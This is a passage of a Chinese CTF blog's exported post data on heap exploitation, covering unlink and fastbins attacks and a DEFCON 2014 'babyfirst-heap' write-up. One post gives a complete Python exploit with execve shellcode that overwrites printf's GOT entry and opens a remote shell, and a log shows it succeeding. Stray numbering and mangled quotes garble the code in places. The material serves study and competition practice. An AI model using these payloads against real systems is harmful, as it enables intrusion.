它能够使得条件比较变得奇怪，以及更改指针索引等操作，也可能更改操作逻辑 整数溢出(Integer Overflow) 在32位数字和64位数字中，如果超出最大值或最小值，则会发生溢出。 例如，通过条件比较后故意溢出，可能导致申请很大的内存，或者使其很小 目录遍历 当二进制程序处理PATH时，可能被利用 使用../../../../../proc/self/maps 之类的可以用于获取内存映射信息 其他Unlink经典题目Plaid CTF 2014 – Pwnables200 –ezhp 基本信息： menu显示后，读取用户输入 可以输入1-4，使用jmp_table[idx]的形式调用对应函数 四个函数命名为add_note, remove_note, change_note, print_note add_note/remove_note有自己定义的malloc/free实现方式及堆管理 使用这样的结构体 1234567struct note &#123; unsigned int size; note* next; note* prev; char* msg; ... &#125; change_note有明显的溢出漏洞 可以通过重写next和prev来进行Unlink Attack 攻略方法： 这个二进制程序没有开启NX，服务器上开启了ASLR，这里有几种方法 通过Unlink让GOT指向堆chunk(与前面的babyfirst-heap相同的方式) https://fail0verflow.com/blog/2014/plaidctf2014-pwn200-ezhp.html http://tasteless.eu/2014/04/plaidctf-2014-ezhp-writeup/ 结合Unlink来泄漏堆值，写入GOT及jmp shellcode http://x86overflow.blogspot.jp/2014/04/plaidctf-pwnable-200-ezhp.html https://docs.google.com/document/d/19Tpc7skiAJCof-rQgwQQN1uZ6baq0KW4Ag910RybCC4/edit?pli=1 http://daehee87.tistory.com/386 https://blog.skullsecurity.org/2014/plaidctf-writeup-for-pwnage-200-a-simple-overflow-bug 结合Unlink，任意内存地址读写的方法 读取GOT的值，计算libc的偏移地址，加载system https://github.com/osirislab/CTF-Solutions/blob/master/PCTF_2014/ezhp/ezhp.py 通过Unlink将ppret加载到GOT并执行read(0, note[id], size) 返回note[id]将不通过read而通过ppret，也就能够执行shellcode https://pastebin.com/mEHQdcRW (只是有一定概率成功) HITCON CTF 2014 Pwnables 550 –stkof 基本信息： 读取用户输入 可以输入1-3，调用对应函数 三个函数命名为alloc_mem, write_mem, free_mem alloc_mem获得的地址，存储在bss上的PTR_TABLE[IDX++]中 write_mem有明显的溢出问题 可以通过重写next, prev进行fastbins attack 攻略方法： 这个二进制程序启用了NX，ASLR，有两种之前提到的可用方法 通过覆盖chunk，让bss中存在的地址被认为是已经释放状态，故意创建了一个Use After Free情况，之后进行Unlink Attack http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/ 使用fastbins attack的简单解法 https://rzhou.org/~ricky/hitcon2014/stkof/ 附加了详细解释 http://pastebin.com/pwCxUE2V (fastbins attack) http://pastebin.com/3hiWVeNw (Unlink attack) Hack.lu CTF Exploiting400 oreo基本信息： 显示menu后，读取用户输入 可以输入1-5，调用对应函数 五个函数命名为Add_new_rifle, Show_added_rifles,Order_selected_rifles,Leave_a_Message_with_your_Order, Show_current_stats 使用这样的结构体： struct RIFLE { char description[25]; char name[25]; char align[2]; RIFLE* next; } Add_new_rifle有明显的溢出问题 可以通过覆盖next进行fastbins attack 攻略方法： 这个二进制程序启用了NX，ASLR 另外，使用了自定义的libc，无法猜测偏移量。攻略方法有三种 想办法找出自定义libc中system的偏移地址 http://ctl.ovh/wapiflapi/oreo.py https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/oreo/ 这是官方预期解法 使用ret2dl_runtime_resolve+DT_DEBUG http://wapiflapi.github.io/2014/11/17/hacklu-oreo-with-ret2dl-resolve/ 查找自定义libc中system的偏移量 猜测官方使用的是latest source构建的libc 从Gentoo Linux的每周Auto build的stage3.tar.bz2中获取libc，计算偏移量 http://www.pastebin.com/9vq38BYH","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"DEFCON 2014 CTF-Baby's First-heap 动态分析及exploit","slug":"DEFCON-2014-CTF-Baby-s-First-heap-动态分析及exploit","date":"2019-03-28T02:10:17.000Z","updated":"2019-03-28T02:11:24.570Z","comments":true,"path":"2019/03/28/DEFCON-2014-CTF-Baby-s-First-heap-动态分析及exploit/","link":"","permalink":"https://darkwing.moe/2019/03/28/DEFCON-2014-CTF-Baby-s-First-heap-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%8F%8Aexploit/","excerpt":"","text":"考虑Unlink Attack分配260字节后堆是这样的 这次为了详细说明，图中也显示size memcpy()造成溢出 array[11]现在是使用中状态，可以通过堆溢出使其成为类似free状态的结构 具体地说，就是通过堆溢出写入size，fd，bk等 free()的时候，判断是否执行unlink()相关操作 Unlink的判断，会对array[10]之上和之下的chunk各进行一次 对上面的chunk，检查自身size变量上的PREV_INUSE比特位(此处省略，暂时不关注) 对下面的chunk，检查下面第二个chunk的size上的PREV_INUSE比特位(注意这个) array[10]进行free时，检查上面和下面的chunk是否是free状态 PREV_INUSE比特位是1，所以认为array[11]是使用中状态 如何找到下面第二个的size变量位置 根据array[10]的位置加上size，能够找到array[11]的位置 根据array[11]的位置加上size，能够找到array[12]的位置 通过伪造size来伪造位置 例如，将array[11]的size更改为-4 使260字节数据的末尾比特是偶数 这样从array[10]看的话，下面的chunk就是free状态，会进行unlink 要得到下面第二个chunk的位置，需要加上这个size，它是负数 这样计算得到的array[12]的地址是array[10]的末尾，它的PREV_INUSE是0，使得系统认为array[11]是free状态 其他的注意点 实际的内存中，-4表示为0xfffffffc array[11]的size变量末尾也存在PREV_INUSE比特位，是1 因为array[10]到现在为止还是使用中状态，如果是0的话在unlink之前就会出错 Unlink之前，fd和bk准备成以下状态 此时，执行以下操作（P应视为array[11]） P-&gt;fd-&gt;bk = P-&gt;bk P-&gt;bk-&gt;fd = P-&gt;fd Unlink完成后，X周围区域已被重写 array[10]周围也被重写 调整使得X-&gt;bk成为printf的GOT(保存函数地址的区域) 从260字节区域开始写入shellcode 当调用printf的时候，会跳转到shellcode 动态分析及检查实际上是否真的按这个流程，我们可以用gdb来进行观察 安装gdb和之后使用的socat $ apt-get install gdb socat 安装peda $ git clone https://github.com/longld/peda.git ~/peda $echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit peda的检查 $ gdb -q /bin/ls 启动后，输入’start’，当出现彩色画面时，说明安装成功 我经常写下面这种gdb脚本文件 123456789101112131415161718192021222324$ cat cmdset follow-fork-mode childdef show_heap printf &quot;array[10].ptr begin\\n&quot; x&#x2F;8xw *(int*)($esp+0x60) printf &quot;array[10].ptr end-0x10\\n&quot; x&#x2F;8xw *(int*)($esp+0x60)+0x104-0x10 printf &quot;array[11].ptr begin\\n&quot; x&#x2F;8xw *(int*)($esp+0x68) printf &quot;array[11].ptr end-0x10\\n&quot; x&#x2F;8xw *(int*)($esp+0x68)+0x374-0x10end# memcpyb *0x08048AA6# freeb *0x08048afa ignore 2 0x0ashell perl -e &#39;print &quot;\\x00&quot;x260 . pack(&quot;III&lt;&quot;, 0xfffffffd, 0x804C004-8, 0x804F350)&#39; &gt; pwnr &lt; pwn 因为alarm()会妨碍分析，使用peda的函数使其无效 显示heap分配的内存地址信息 在free和memcpy上创建断点(不对前10次free断点) 堆的地址是本身是随机的，这里通过gdb运行是固定地址，除非明确关闭对应选项。我的环境中第11个堆地址是硬编码的，就是这个 memcpy()前后 产生了堆溢出，覆盖了下一个chunk 第11次free前后 第11次free之后 查看printf@got 可以看到已经被重写为堆的地址 原始的值是这样 之后继续运行 跳到了0x0804f350(堆区域)，SIGSEGV 我们已经控制了EIP的值(可以在此处写入shellcode) 进行exploit接下来只需要写脚本 以这个为基础 perl -e &#39;print &quot;\\x00&quot;x260 . pack(&quot;III&lt;&quot;, 0xfffffffd, 0x804C004-8, 0x804F350)&#39; shellcode还没准备好 需要将””\\x00”x260”的部分改为shellcode 堆地址的动态对应 堆地址本身是随机的，这道题目将其显示出来的 实际环境中，是需要通过网络发送payload后，在远程服务器获取flag 实施NW通信 写一个脚本 首先需要一个网络发送数据的模板 参考PPP的Write-up #!/usr/bin/python # -*- coding: utf-8 -*- import socket, struct, re, telnetlib def sock(remoteip, remoteport): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((remoteip, remoteport)) return s, s.makefile(&apos;rw&apos;, bufsize=0) def read_until(f, delim=&apos;¥n&apos;): data = &apos;&apos; while not data.endswith(delim): data += f.read(1) return data def p(a): return struct.pack(&quot;&lt;I&quot;,a) def shell(s): t = telnetlib.Telnet() t.sock = s t.interact() 12345678910- 实际攻击部分如下- 可以在下面地址找到shellcode，也可以自己构造 - http:&#x2F;&#x2F;shell-storm.org&#x2F;shellcode&#x2F;- 堆地址的动态对应只需要使用正则表达式解析服务器响应- # linux/x86/execve_binsh shellcode = &quot;\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x8d\\x42\\x0b\\xcd\\x80&quot; s, f = sock(“localhost”, 4088)#s, f = sock(“katagaitai.orz.hm”, 1111)ret = read_until(f, “Write to object [size=260]:”)print retheap_addr = int(re.findall(r”loc=([^]]+)”, ret)[10], 16)print hex(heap_addr) sc = “\\xeb\\x08” + ‘¥x00’*8 + shellcode.ljust(250, ‘¥x00’) + p(0xfffffffd) + p(0x0804C004-8) + p(heap_addr)f.write(sc + “\\n”)shell(s) 123456- 最终完整代码在这里- &lt;https:&#x2F;&#x2F;pastebin.com&#x2F;Cw6haUw5&gt;- #!/usr/bin/python -- coding: utf-8 --import socket, struct, re, telnetlib ###################### useful function definitiondef sock(remoteip, remoteport): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((remoteip, remoteport)) return s, s.makefile(‘rw’, bufsize=0) def read_until(f, delim=’\\n’): data = ‘’ while not data.endswith(delim): data += f.read(1) return data def p(a): return struct.pack(“&lt;I”,a) def shell(s): t = telnetlib.Telnet() t.sock = s t.interact() ###################### main linux/x86/execve_binshshellcode = “\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x8d\\x42\\x0b\\xcd\\x80” s, f = sock(“localhost”, 4088)#s, f = sock(“katagaitai.orz.hm”, 1111)ret = read_until(f, “Write to object [size=260]:”)print retheap_addr = int(re.findall(r”loc=([^]]+)”, ret)[10], 16)print hex(heap_addr) sc = “\\xeb\\x08” + ‘¥x00’*8 + shellcode.ljust(250, ‘¥x00’) + p(0xfffffffd) + p(0x0804C004-8) + p(heap_addr)f.write(sc + “\\n”)shell(s) 1234567891011121314- 由于Unlink稍微破坏了数据的开头，因此适当地连接0xEB 0x08，以便相对跳转可以跳过开头的2到10个字节。## 发送exploit后的内存情况(memcpy之后)![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032708.jpg)当unlink完成时，0x0804f350被写入printf@got，也就是说，当调用printf时，它会跳转到0x0804f350。但是，unlink之后，进行P-&gt;bk-&gt;fd &#x3D; P-&gt;fd这样的处理，第5-8字节被破坏了，因此第一二字节使用了short jmp跳过了被破坏的区域，进入执行shellcode# NW通信测试## 实际NW环境 $ adduser user$ cp ./heap /home/user/$ chown user:user /home/user/heap$ su user$ socat TCP-LISTEN:4088,fork,reuseaddr EXEC:/home/user/heap &amp;$ exit $ netstat -antpu |grep socattcp 0 0 0.0.0.0:4088 0.0.0.0:* LISTEN 17728/socat$ 12345678## 尝试以另一个用户身份运行脚本- 以运行socat的用户权限打开shell - 访问前修改脚本中的IP信息为远程环境信息- $ id uid=0(root) gid=0(root) groups=0(root) $ python exp.py (略) [FREE][address=9AA4C98] [FREE][address=9AA5058] [FREE][address=9AA5350] id uid=501(user) gid=502(user) groups=502(user)","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"DEFCON 2014 CTF-Baby's First-heap 基本知识及静态分析","slug":"DEFCON-2014-CTF-Baby-s-First-heap-基本知识及静态分析","date":"2019-03-26T01:23:15.000Z","updated":"2019-03-26T01:24:24.408Z","comments":true,"path":"2019/03/26/DEFCON-2014-CTF-Baby-s-First-heap-基本知识及静态分析/","link":"","permalink":"https://darkwing.moe/2019/03/26/DEFCON-2014-CTF-Baby-s-First-heap-%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E5%8F%8A%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/","excerpt":"","text":"Setup 下载题目文件到Linux系统环境中 http://shell-storm.org/repo/CTF/Defcon-22-quals/heap-1/ 文件名有点长，做下重命名 mv babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c heap 赋予运行权限 chmod +x heap 运行 ./heap 不能运行的话，可能是因为使用的是64位系统 在x86_64环境中运行不能直接运行x86的二进制程序 Ubuntu 14.04以后版本 dpkg --add-architecture i386 apt-get update apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386 $ apt-get install gcc-multilib g++-multilib 123456## 初步调查- 每次都需要做的初步检查 - $ file heap heap: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=1b4e88004c13ca18ef78ac90b298c1e247c1d4e5, with debug_info, not stripped $ ldd heap linux-gate.so.1 (0xf7ee0000) libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7ce8000) /lib/ld-linux.so.2 (0xf7ee2000) $ checksec --file heap #http://www.trapkit.de/tools/checksec.html RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Partial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 113 Symbols No 0 8 heap 1234- 使用的库函数列表 - Relocation section &apos;.rel.plt&apos; at offset 0x558 contains 14 entries: Offset Info Type Sym.Value Sym.Name 0804c000 00000107 R_386_JUMP_SLOT 00000000 mprotect@GLIBC_2.0 //更改内存属性 0804c004 00000207 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.0 //显示文字 0804c008 00000307 R_386_JUMP_SLOT 00000000 memcpy@GLIBC_2.0 //拷贝内存 0804c00c 00000407 R_386_JUMP_SLOT 00000000 signal@GLIBC_2.0 //定义收到信号时的操作 0804c010 00000507 R_386_JUMP_SLOT 00000000 alarm@GLIBC_2.0 //在一段时间后提出异常 0804c014 00000607 R_386_JUMP_SLOT 00000000 _IO_getc@GLIBC_2.0 //读取一个字符 0804c018 00000707 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.0 //显示一行 0804c01c 00000807 R_386_JUMP_SLOT 00000000 __gmon_start__ //使用gprof等收集统计信息时使用的函数。由于通常不使用它，因此可以忽略它 0804c020 00000907 R_386_JUMP_SLOT 00000000 exit@GLIBC_2.0 //退出函数 0804c024 00000a07 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 //调用main的包装函数 0804c028 00000b07 R_386_JUMP_SLOT 00000000 fprintf@GLIBC_2.0 //向文件指针输出内容 0804c02c 00000c07 R_386_JUMP_SLOT 00000000 setvbuf@GLIBC_2.0 //更改缓冲行为 0804c030 00000d07 R_386_JUMP_SLOT 00000000 memset@GLIBC_2.0 //设置内存值 0804c034 00000e07 R_386_JUMP_SLOT 00000000 sbrk@GLIBC_2.0 //扩张heap区域 1234567891011121314151617181920 上述函数没有bind, listen, accept等，因为没有实现NX处理## fork-server型与xinetd型- CTF题目常见的有两种- fork-server型，xinetd型- fork-server型 - 二进制程序中有bind-&gt;listen-&gt;accept的类型 - ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032501.jpg) - 这种情况下，需要去调试子进程 - 如果未在gdb中设置set follow-fork-mode child，则仅调试父进程(并且父进程将继续存在，因此您需要每次都kill父进程)- xinetd型 - 二进程程序中没有bind-&gt;listen-&gt;accept的类型(用xinetd代替) - ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032502.jpg) - 在这种情况下，使用gdb等工具调试时，不需要考虑NW - 但是，在实际编写exploit进行测试时，可以用过socat来添加NW关系 - 也就是说，对于xintd型，在调试时不需要考虑NW交换，但在编写exploit时需要考虑NW上的通信## 简单运行了解下流程 $ ./heap ... [ALLOC][loc=84354B0][size=823] Write to object [size=260]: AAAAA // 尝试输入简单的值 Copied 6 bytes. [FREE][address=8431008] ... [FREE][address=84354B0] Did you forget to read the flag with your shellcode? Exiting // 什么也没发生 12## 由于之前有[size &#x3D; 260]的描述，尝试发送260个字节 $ python -c &apos;print &quot;A&quot;*260&apos; | ./heap //使用python生成260个字符，发送给二进制程序 ... [ALLOC][loc=8E3E4B0][size=823] Write to object [size=260]: Copied 261 bytes. [FREE][address=8E3A008] ... [FREE][address=8E3C058] [1] 7910 done python -c &apos;print &quot;A&quot;*260&apos; | 7911 segmentation fault (core dumped) ./heap //crash了，如果是259个字符，则刚好不会crash 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# 静态分析- 下载安装IDA Free版本 - https:&#x2F;&#x2F;www.hex-rays.com&#x2F;products&#x2F;ida&#x2F;support&#x2F;download.shtml- 启动后，加载要分析的二进制文件并等待一段时间以完成分析- Options→General更改一些设置 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032503.jpg)- Graph View的整体视图如下所示 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032504.jpg)- 基本上，可以通过call指令和引用字符串作为提示推测程序流程 - 即便不怎么读程序汇编代码，也能够通过使用方式来了解大概- 很难一口气阅读所有内容 - 我试着一点一点分组阅读 - 对于很明显的循环部分，可以先放在一起## 循环部分先放在一起，稍后再看![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032505.jpg)左边这些选中部分注释为ALLOC LOOP，由于左下方块中存在字符串ALLOC，因此可能执行此类处理- 其他的循环也同样添加注释，最后看起来应该是这样的（很容易想象）![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032506.jpg)点击这个将重新展开## 分析第一块- 堆栈顶部是变量- 选择变量后按&#39;N&#39;键可以进行命名- &#39;:&#39; 对这一行进行注释- &#39;Insert&#39;在这一行上方进行注释- &#39;Shift&#39;+&#39;insert&#39;在这一行下方进行注释- 对于不知道的函数，可以通过&#96;man &lt;function name&gt;&#96;进行检索- 深蓝色文字是符号，可以双击跳转- 如果需要返回可以按&#39;Esc&#39;，或者工具栏上的&#39;←&#39;按钮- 粗略阅读时，使用这些会使得可读性很好- 目的是为了理解代码内容以及解释反编译的代码## 第一块看起来像这样![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032507.jpg)C语言代码大概像这样 setvbuf(stdout, 0, 2, 0); signal(14, sig_alarm_handler); alarm(0x5Au); //90秒后，调用sig_alarm_handler并将其杀死 mysrand(0x1234u); //可能是随机数种子设置（但每次都固定） puts(&quot;\\nWelcome to your first heap overflow...&quot;); puts(&quot;I am going to allocate 20 objects...&quot;); puts(&quot;Using Dougle Lee Allocator 2.6.1...\\nGoodluck!\\n&quot;); exit_func = do_exit; //复制退出时调用的函数指针 printf(&quot;Exit function pointer is at %X address.\\n&quot;, &amp;exit_func); 12345678910111213141516171819202122232425262728293031323334353637383940## 第二块看起来像这样![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032508.jpg)- 仔细看这段代码- stack上看起来有ptr, size, ptr, size…这样的20个排列 - Structures窗口中，制作结构体会更加容易 - Insert→指定结构体名称 - 可以通过反复按&#39;D&#39;切换类型 - db: 1byte - dw: 2byte - dd: 4byte - 按&#39;N&#39;对变量重命名 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032509.jpg)- 切换到Stack frame窗口，选中这个变量- Edit→Struct var，应用创建的结构体 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032511.jpg)- &#39;N&#39;重命名为array- 然后使用数字键盘上的&#39;*&#39;进行数组排列 - size是20 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032512.jpg)- stack上进行结构体应用后大概像这样 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032510.jpg)- C语言代码大概像这样- for ( i = 0; i &lt;= 0x13; ++i ) //20次循环 { random_size = randrange(0x200u, 0x500u); //很容易理解的随机数生成 if ( i == 10 ) //第11次固定260 random_size = 260; array[i].ptr = malloc(random_size); //分配random_size的内存 array[i].size = random_size; //保存这个随机值 printf(&quot;[ALLOC][loc=%X][size=%d]\\n&quot;, array[i].ptr, random_size); } 123456## 第三块看起来像这样![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032601.jpg)C语言代码大概像这样： printf(&quot;Write to object [size=%d]:\\n&quot;, array[10].size); count = get_my_line(&amp;buff, 0x1000u); //stack上的buffer中读取最多0x1000个字符 memcpy(array[10].ptr, &amp;buff, count); //复制到指针指向区域(产生堆溢出) printf(&quot;Copied %d bytes.\\n&quot;, count); 123456## 第四块看起来像这样![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032602.jpg)C语言代码大概像这样 for ( i = 0; i &lt;= 0x13; ++i ) //20次free { printf(&quot;[FREE][address=%X]\\n&quot;, array[i].ptr); free(array[i].ptr); } 123456## 第五块看起来像这样![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019032603.jpg)C语言代码大概像这样 exit_func(1u); return 0; 12## 总体代码逻辑 int main(void){ setvbuf(stdout, 0, 2, 0); signal(14, sig_alarm_handler); alarm(0x5Au); //90秒后，调用sig_alarm_handler并将其杀死 mysrand(0x1234u); //可能是随机数种子设置（但每次都固定） puts(&quot;\\nWelcome to your first heap overflow...&quot;); puts(&quot;I am going to allocate 20 objects...&quot;); puts(&quot;Using Dougle Lee Allocator 2.6.1...\\nGoodluck!\\n&quot;); exit_func = do_exit; //复制退出时调用的函数指针 printf(&quot;Exit function pointer is at %X address.\\n&quot;, &amp;exit_func); for ( i = 0; i &lt;= 0x13; ++i ) //20次循环{ random_size = randrange(0x200u, 0x500u); //很容易理解的随机数生成 if ( i == 10 ) //第11次固定260 random_size = 260; array[i].ptr = malloc(random_size); //分配random_size的内存 array[i].size = random_size; //保存这个随机值 printf(“[ALLOC][loc=%X][size=%d]\\n”, array[i].ptr, random_size);}printf(“Write to object [size=%d]:\\n”, array[10].size);count = get_my_line(&amp;buff, 0x1000u); //stack上的buffer中读取最多0x1000个字符memcpy(array[10].ptr, &amp;buff, count); //复制到指针指向区域(产生堆溢出)printf(“Copied %d bytes.\\n”, count); for ( i = 0; i &lt;= 0x13; ++i ) //20次free{ printf(“[FREE][address=%X]\\n”, array[i].ptr); free(array[i].ptr);} exit_func(1u);return 0;} 时间序列表示堆的状态 20次重复，第11个固定260byte 指针及size一起存储在stack中 第11个节点进行堆溢出 从前到后依次free() 已知信息 只是申请内存，覆盖和释放 申请的内存不用于其他 是一道关于覆盖堆管理区域的问题 这也可以从启动消息中理解 Welcome to your first heap overflow…I am going to allocate 20 objects…Using Dougle Lee Allocator 2.6.1…Goodluck! 看起来就是想让使用Unlink Attack","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记8:fastbins attack","slug":"Pwn学习笔记8-fastbins-attack","date":"2019-03-21T06:32:22.000Z","updated":"2019-03-21T06:33:08.053Z","comments":true,"path":"2019/03/21/Pwn学习笔记8-fastbins-attack/","link":"","permalink":"https://darkwing.moe/2019/03/21/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08-fastbins-attack/","excerpt":"","text":"fastbins为了高速化而实现的机制 www.valinux.co.jp/technologylibrary/document/linux/malloc0001/ bins和fastbins 之前提到过libc中存在一个为了快速搜索free区域而存在的链表 这是arena(malloc_state构造体)中存在的列表头 free状态的chunk根据相似大小来管理，因此会有多个列表 size比较小的chunk，free的时候会暂时和fastbins连接 这个链表是单向的 每个chunk在x86环境下是小于64字节，x86_64环境下是小于128字节 也存在bk成员变量，但因为高速化，不会使用到 进入fastbins的小的chunk如果是像下面这样的状态，就存在堆溢出 覆盖fd 这就可能进行fastbins attack 正常的malloc() 假设有一个像这样的fastbins列表 各个chunk根据size连接到fastbins列表 图中也显示size，因为它很重要 取出fastbins的第一个元素，进行简单的检查 检查P-&gt;size，判断它是否在正确的fastbins列表里 连接到fastbins的小的chunk是根据size大小决定要连接到哪个fastbins列表上 之后，将其从列表中删除 exploit的流程 通过P2上的堆溢出覆盖fastbins上的P的fd 使其指向X 进行malloc()的时候P被unlink fastbins列表现在和X相连接 下次进行malloc()时，就可能返回X 但是X下面没有合适的size也不行 因为存在判断它是否在正确的列表中 原本malloc()的返回值是堆的地址，通过这种方式就能够让返回X 假设X是一个保存函数地址的区域(例如GOT) 也就可以通过对malloc()的返回值，也就是X进行特定值写入，来覆盖GOT 有什么困难 这不仅是对用户进程的hack，还要跟踪libc中的内容 fastbins感觉不太出名 仅通过分析给出的二进制程序来解决它是不可能的 需要了解libc.so中malloc和free的行为相关知识","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记7:Unlink Attack 中级","slug":"Pwn学习笔记7-Unlink-Attack-中级","date":"2019-03-19T07:13:31.000Z","updated":"2019-03-19T07:15:18.503Z","comments":true,"path":"2019/03/19/Pwn学习笔记7-Unlink-Attack-中级/","link":"","permalink":"https://darkwing.moe/2019/03/19/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07-Unlink-Attack-%E4%B8%AD%E7%BA%A7/","excerpt":"","text":"特殊的Unlink AttackUnlink Attack的应用 HITCON CTF 2014上，有一道只有三支队伍解出的题目 Pwnables 550 - stkof 解出题目的是以下三支队伍： tomcr00se PPP teamlol 介绍一下用于解决这道题目的技术 这道题目是x86_64的二进制程序，但我会用x86的内存布局来说明它 注意，实际的二进制中，各个区域都是两倍 如果能够满足下述约束条件，就能够进行特殊的Unlink Attack P-&gt;fd-&gt;bk == P P-&gt;bk-&gt;fd == P 不仅需要堆溢出，Use After Free也是必须的 exploit的流程 假设预先存在指向P的X X在.bss区域中，并且预先知道地址 X指向已经free的P，就像它尚未被释放一样 我们无法控制X指向的地址 通过堆溢出进行覆盖 P-&gt;fd:X之前12字节 P-&gt;bk:X之前8字节 如图所示： 从X-0xC的位置开始看的话，X相当于bk的位置 从X-0x8的位置开始看的话，X相当于fd的位置 也就是说，P-&gt;fd-&gt;bk == X-0xC-&gt;bk == X == P &amp;&amp; P-&gt;bk-&gt;fd == X-0x8-&gt;fd == X == P，满足条件 free(P2)的时候，相连接的P被unlink 本应该无法控制的X的值现在可以被更改 X应该最初指向P X的指向(=*X)，存在保存用户输入的情况 使用(Use After Free的)X，可能覆盖P 然后X-0xC的内容将改变 也就是说，X-0xC可以被改为指向GOT X-0xC的指向(=*(X-0xC))，存在保存用户输入的情况 信任X-0xC并且写入数据 能够进行GOT overwrite 这种方法是Shellphish战队子大会结束后公开的技术 http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/ 他们在比赛期间也没有解决 有图的话会非常容易理解，实际上的exploit构造非常麻烦 事实上，也存在更容易理解的解法： 大会结束后，PPP战队在IRC频道中公开的技术非常好 14:52 (ricky) Here are most of my solutions: https://rzhou.org/~ricky/hitcon2014/ 14:53 (ricky) Curious as to what others did 14:53 (tomcr00se) i don&apos;t understand your stkof 14:54 (tomcr00se) how did you link in 0x602100 without throwing one of 10 million asserts 14:55 (ricky) I used the fastbins - the only check is that the size matches the fastbin (and the size is the index for the next entry) 14:55 (ricky) So I made enough entries to make the index correct 14:55 (ricky) Now I&apos;m really curious about how you did it","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记6:Unlink Attack 